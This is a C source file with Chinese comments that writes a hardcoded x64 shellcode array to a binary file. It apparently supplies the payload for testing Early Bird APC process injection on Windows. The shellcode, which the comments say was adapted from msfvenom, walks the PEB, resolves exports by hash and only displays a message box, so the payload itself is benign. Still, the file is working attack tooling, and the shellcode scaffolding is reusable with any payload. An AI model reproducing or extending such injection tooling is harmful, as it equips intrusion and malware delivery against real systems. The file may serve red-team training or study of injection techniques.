/**
 * ===================================================================
 * Shellcode 生成器
 * ===================================================================
 *
 * 这个程序生成一个简单的 MessageBox shellcode 并保存为二进制文件
 * 用于测试 Early Bird APC Injection
 *
 * 编译：gcc generate_shellcode.c -o generate_shellcode.exe
 * 用法：generate_shellcode.exe <输出文件>
 * ===================================================================
 */

#include <windows.h>
#include <stdio.h>

/**
 * MessageBox shellcode (x64)
 *
 * 功能：弹出消息框显示 "Early Bird APC Injection 成功！"
 *
 * 这是一个位置无关代码（PIC），使用以下技术：
 * 1. PEB 遍历获取 kernel32.dll 和 user32.dll 基址
 * 2. 解析导出表获取 LoadLibraryA 和 MessageBoxA 地址
 * 3. 调用 MessageBoxA 显示消息
 * 4. 调用 ExitProcess 退出
 *
 * 注意：这是从 msfvenom 生成的 shellcode 修改而来
 */
unsigned char shellcode[] =
    // MessageBox shellcode (x64)
    // 显示 "Early Bird APC!" 消息框
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
    "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
    "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
    "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
    "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
    "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
    "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
    "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
    "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
    "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
    "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
    "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
    "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
    "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
    "\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
    "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
    "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x45\x61\x72"
    "\x6c\x79\x20\x42\x69\x72\x64\x20\x41\x50\x43\x20\x49\x6e\x6a"
    "\x65\x63\x74\x69\x6f\x6e\x20\xe6\x88\x90\xe5\x8a\x9f\xef\xbc"
    "\x81\x00\x45\x61\x72\x6c\x79\x20\x42\x69\x72\x64\x20\x41\x50"
    "\x43\x00";

int main(int argc, char* argv[]) {
    if (argc != 2) {
        printf("用法：%s <输出文件>\n", argv[0]);
        printf("示例：%s payload.bin\n", argv[0]);
        return 1;
    }

    const char* outputFile = argv[1];
    unsigned int shellcodeSize = sizeof(shellcode) - 1; // 减去字符串结束符

    // 创建输出文件
    HANDLE hFile = CreateFileA(
        outputFile,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("错误：无法创建文件 %s（错误码：%u）\n", outputFile, GetLastError());
        return 1;
    }

    // 写入 shellcode
    DWORD bytesWritten = 0;
    if (!WriteFile(hFile, shellcode, shellcodeSize, &bytesWritten, NULL)) {
        printf("错误：写入文件失败（错误码：%u）\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    CloseHandle(hFile);

    printf("✓ Shellcode 已生成：%s\n", outputFile);
    printf("  大小：%u 字节\n", bytesWritten);

    return 0;
}
